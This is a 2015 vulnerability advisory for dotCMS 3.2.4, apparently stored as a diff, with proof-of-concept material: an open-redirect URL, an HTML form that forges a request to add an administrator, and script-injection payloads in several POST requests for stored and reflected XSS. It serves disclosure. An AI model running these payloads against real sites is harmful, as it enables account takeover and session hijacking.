@@ -1,0 +1,120 @@
+﻿
+dotCMS 3.2.4 Multiple Vulnerabilities
+
+
+Vendor: dotCMS Software, LLC
+Product web page: http://www.dotcms.com
+Affected version: 3.2.4 (Enterprise)
+
+Summary: DotCMS is the next generation of Content Management System (CMS).
+Quick to deploy, open source, Java-based, open APIs, extensible and massively
+scalable, dotCMS can rapidly deliver personalized, engaging multi-channel
+sites, web apps, campaigns, one-pagers, intranets - all types of content
+driven experiences - without calling in your developers.
+
+Desc: The application suffers from multiple security vulnerabilities including:
+Open Redirection, multiple Stored and Reflected XSS and Cross-Site Request
+Forgery (CSRF).
+
+Tested on: Apache-Coyote/1.1
+
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+                              @zeroscience
+
+
+Advisory ID: ZSL-2015-5290
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5290.php
+
+Vendor: http://dotcms.com/docs/latest/change-log
+        https://github.com/dotCMS/core/commit/7b86fc850bf547e8c82366240dae27e7e56b4305
+        https://github.com/dotCMS/core/commit/1fdebbbd76619992356e9443230e35be8a2b60c3
+
+
+19.11.2015
+
+--
+
+
+1. Open Redirect via '_EXT_LANG_redirect' GET parameter:
+--------------------------------------------------------
+
+http://127.0.0.1/c/portal/layout?p_l_id=a8e430e3-8010-40cf-ade1-5978e61241a8&p_p_id=EXT_LANG&p_p_action=1&p_p_state=maximized&p_p_mode=view&_EXT_LANG_struts_action=%2Fext%2Flanguages_manager%2Fedit_language&_EXT_LANG_cmd=save&_EXT_LANG_redirect=http://zeroscience.mk&id=0&languageCode=MK&countryCode=MK&language=Macedonian&country=Macedonia
+
+
+
+2. CSRF Add Admin:
+------------------
+
+<html>
+  <body>
+    <form action="http://127.0.0.1/dwr/call/plaincall/UserAjax.addUser.dwr" method="POST" enctype="text/plain">
+      <input type="hidden" name="callCount" value="1&#10;windowName&#61;c0&#45;param2&#10;c0&#45;scriptName&#61;UserAjax&#10;c0&#45;methodName&#61;addUser&#10;c0&#45;id&#61;0&#10;c0&#45;param0&#61;null&#58;null&#10;c0&#45;param1&#61;string&#58;TEST2&#10;c0&#45;param2&#61;string&#58;AAAA2&#10;c0&#45;param3&#61;string&#58;AAA2&#37;40bb&#46;net&#10;c0&#45;param4&#61;string&#58;123123&#10;batchId&#61;3&#10;instanceId&#61;0&#10;page&#61;&#37;2Fc&#37;2Fportal&#37;2Flayout&#37;3Fp&#95;l&#95;id&#37;3Da8e430e3&#45;8010&#45;40cf&#45;ade1&#45;5978e61241a8&#37;26p&#95;p&#95;id&#37;3DEXT&#95;USER&#95;ADMIN&#37;26p&#95;p&#95;action&#37;3D0&#37;26&#37;26dm&#95;rlout&#37;3D1&#37;26r&#37;3D1448026121316&#10;scriptSessionId&#61;hd2XkJoJcyP9lEk5N8qUe&#42;ouv5l&#47;mn17B5l&#45;IA&#42;1ZViJ6&#10;" />
+      <input type="submit" value="Tutaj" />
+    </form>
+  </body>
+</html>
+
+
+
+3. Multiple Stored And Reflected XSS:
+-------------------------------------
+
+POST /dwr/call/plaincall/TagAjax.addTag.dwr HTTP/1.1
+Host: 127.0.0.1
+
+callCount=1
+windowName=c0-param0
+c0-scriptName=TagAjax
+c0-methodName=addTag
+c0-id=0
+c0-param0=<script>alert(1)<%2fscript>
+c0-param1=string:
+c0-param2=string:48190c8c-42c4-46af-8d1a-0cd5db894797%20
+batchId=2
+instanceId=0
+......
+
+
+
+POST /dwr/call/plaincall/CategoryAjax.saveOrUpdateCategory.dwr HTTP/1.1
+Host: 127.0.0.1
+
+callCount=1
+windowName=c0-param5
+c0-scriptName=CategoryAjax
+c0-methodName=saveOrUpdateCategory
+c0-id=0
+c0-param0=boolean:true
+c0-param1=null:null
+c0-param2=<script>alert(2)<%2fscript>
+c0-param3=string:ppp
+c0-param4=string:aaa
+c0-param5=string:bbb
+batchId=2
+instanceId=0
+......
+
+
+
+POST /c/portal/layout?p_l_id=a8e430e3-8010-40cf-ade1-5978e61241a8&p_p_id=EXT_LUCENE_TOOL&p_p_action=0& HTTP/1.1
+Host: 127.0.0.1
+
+query=aaaa
+offset="><script>alert(3)<%2fscript>
+limit=20
+sort=1
+userid=admin
+reindexResults=true
+......
+
+
+
+http://127.0.0.1/DotAjaxDirector/com.dotmarketing.portlets.osgi.AJAX.OSGIAJAX [jar parameter]
+http://127.0.0.1/api/portlet/ES_SEARCH_PORTLET/render [URL path filename]
+http://127.0.0.1/c/portal/layout [limit parameter]
+http://127.0.0.1/c/portal/layout [offset parameter]
+http://127.0.0.1/c/portal/layout [query parameter]
+http://127.0.0.1/c/portal/layout [sort parameter]
+http://127.0.0.1/html/portlet/ext/sitesearch/test_site_search_results.jsp [testIndex parameter]
+http://127.0.0.1/html/portlet/ext/sitesearch/test_site_search_results.jsp [testQuery parameter]
